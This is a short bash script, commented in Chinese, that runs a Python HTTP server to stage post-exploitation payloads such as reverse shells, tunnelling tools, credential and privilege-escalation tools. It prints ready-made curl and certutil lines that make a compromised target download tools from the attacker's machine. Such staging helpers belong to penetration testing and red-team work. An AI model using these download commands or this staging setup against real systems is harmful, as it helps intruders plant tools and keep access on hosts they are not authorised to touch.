#!/usr/bin/env bash
# 后渗透文件传输 HTTP 服务器（以 payloads/ 为根目录）
# 用法: ./serve.sh [port] [bind_ip]   默认: 8080, 0.0.0.0
# 目标机: curl -o chisel.exe http://<YOUR_IP>:8080/tunnel/chisel/chisel.exe

set -euo pipefail

PORT="${1:-8080}"
BIND="${2:-0.0.0.0}"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"

echo "[*] Serving payloads on http://$BIND:$PORT/"
echo "    Linux:    curl -o tool http://$BIND:$PORT/linux/<path>"
echo "    Windows:  certutil -urlcache -f http://$BIND:$PORT/windows/<path> tool"
echo "    RevShell: http://$BIND:$PORT/revshell/"
echo "    Tunnel:   http://$BIND:$PORT/tunnel/<tool>/"
echo ""
echo "    windows/  ad creds exec privesc scan transfer"
echo "    revshell/ tunnel/ linux/"

python3 -m http.server "$PORT" --bind "$BIND" --directory "$SCRIPT_DIR"
